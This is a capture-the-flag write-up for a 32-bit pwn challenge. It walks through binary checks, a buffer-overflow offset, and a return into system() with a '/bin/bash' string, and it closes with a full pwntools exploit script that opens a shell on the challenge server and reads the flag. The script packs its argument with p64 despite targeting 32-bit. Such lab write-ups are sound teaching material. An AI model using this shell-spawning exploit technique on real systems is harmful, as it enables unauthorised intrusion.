## Description 
Not used
Pwn · Харуул Занги: 2018 · reamb
Solved: 5 · Score: 990
nc 139.162.5.230 10242
Files:

notused
notused.c

## Solution
Lets start off with some basic file checks
```
[Output of file]
notused: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=846dd75263225fa5a162e99a2ad25f3cee03cf07, with debug_info, not stripped
```
```
[Output of checksec]
[*] '/home/kali/ctf/ctfmn/pwn/not-used/notused'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
```
32-bit executable that is vulnurable to bof and we have to call `system()` with the not used `/bin/bash` string to get a shell
. Using radare2 i found the address of `/bin/bash` to be
```
0x08048624
```
now we need to know where the address of the system function and thats simple as writing `exe.symbols.system` with the help of pwntools .Now we just do cyclic to find the IP offset. And the offset is `132`.

Now we just pad the buffer and the Base Pointer register and we can pass `/bin/bash` as the variable and call `system()` function to get a shell. Note: system function calls first variable is the return address so we can just pad that out with `0x0`. Also 32-bit and 64-bit function calling conventions are little bit different so keep that in mind.

And here is my final script
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'notused',checksec=False)

host = args.HOST or '139.162.5.230'
port = int(args.PORT or 10242)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

context.log_level='critical'

bin_bash = 0x08048624
padding = 132

payload = flat([
    b'A' * padding,
    exe.symbols.system,
    0x0,
    p64(bin_bash)
    ])

io = start()

io.recv()
io.sendline(payload)

io.sendline(b"cat flag.txt")
flag = io.recvuntil(b"}")
print(flag.decode())

io.close()
```